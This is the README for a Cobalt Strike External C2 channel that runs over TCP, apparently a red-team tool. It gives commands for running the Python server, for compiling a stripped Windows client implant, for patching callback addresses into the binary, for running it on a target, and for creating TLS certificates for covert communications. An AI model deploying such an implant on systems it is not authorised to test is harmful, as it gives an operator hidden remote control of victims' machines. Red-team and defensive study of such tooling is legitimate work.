# COBALT STRIKE TCP CHANNEL

This project provides a TCP-based communication channel for Cobalt Strike. This is meant as a base for covert channels implemented in any TCP-based protocol.

To use the channel, load up Cobalt Strike and add a new External C2 listener.
This channel is configured to run on the default Teamserver port of 2222.

Requirements: Python3 (developed on 3.9.2) and wolfssl

> pip3 install wolfssl

To start the server, run the following command:

> python3 [Name].py [Teamserver IP] [Python Server IP] [Port] [Pipename] [OPTIONAL:-tp TeamserverPort -a Arch -r Restart]

- [Name] is the name of your Python server.
- [Teamserver IP] is the IP of your Cobalt Strike teamserver.
- [Python Server IP] is the IP of the machine you are running server.py on. (“0.0.0.0” has been found to work on Linux machines, though it is unknown if this behavior is consistent everywhere.)
- [Port] is the port that the server listens on to communicate with the client over. This is not the same port that the Python server uses to communicate with the teamserver.
- [Pipename] is the name of the pipe the client creates when it runs on the target. This could be any opsec appropriate pipe name approved for ops.  
- [TeamserverPort] is the port to connect to on the Cobalt Strike teamserver. It defaults to 2222 and is an optional argument.
- [Arch] is the architecture to request from the teamserver for the beacon. It defaults to x86 and is an optional argument.
- [Restart] is a Y/N value to either restart the server after disconnect or exit. Default is N and is an optional argument.

If you have the MinGW compiler installed, you may compile the client C code with the following command:

>i686-w64-mingw32-gcc -s -O3 -fvisibility=hidden -o client.exe client.c -lws2_32 -static -lwsock32 -lwolfssl

or 64-bit with:

>x86_64-w64-mingw32-gcc -s -O3 -fvisibility=hidden -o client.exe client.c -lws2_32 -static -lwsock32 -lwolfssl

You can compile the debug version of the client with print statements by adding `-DDEBUG` to the end of the compile command

Change the client exe name if desired.
Move the resultant executable to your target machine, and then run it with the following command:

>./[Name].exe

Use the binary patcher to patch in arguments.

>python3 bipa.py [input binary] [output binary] -a [Python Server IP] -b [Port] -c [Pipename] -d [Sleep] -e [Timeout]

- [Python Server IP], [Port], and [Pipename] must be the same as the ones passed to server.py.
- [Sleep] is the sleep time (in seconds) to wait between check ins with the server. It hits this sleep when the beacon indicates it has nothing left to send back to the server and is just checking in.
- [Timeout] is the send/recv socket timeout option (in seconds) set by setsockopt(). May remove in future.

## CONSTRAINTS AND NOTES

- This channel expects only one client per instance of server.py. Multiple clients communicating with the same server requires multiple instances of server.py running on different ports.
- The client closes the TCP connection, sleeps, then reopens the TCP connection. If there is a small sleep timer, this will result in a lot of short TCP sessions with the source port increasing. If the link/path dies during this sleep the client will timeout (after sleeping and attempting to reconnect) and the server will get stuck on accept() waiting for the client to connect back in. You will need to restart the server to use it again.
- Create certs. Server gets server-cert.pem and server-key.pem. Client gets ca-cert.pem

>openssl genrsa 2048 > ca-key.pem
>openssl req -new -x509 -nodes -days 365000 -key ca-key.pem -out ca-cert.pem
>openssl req -newkey rsa:2048 -nodes -days 365000 -keyout server-key.pem -out server-req.pem
>openssl x509 -req -days 365000 -set_serial 01 -in server-req.pem -out server-cert.pem -CA ca-cert.pem -CAkey ca-key.pem

## TODOS/IMPROVEMENTS

- Handle multiple clients on one server.
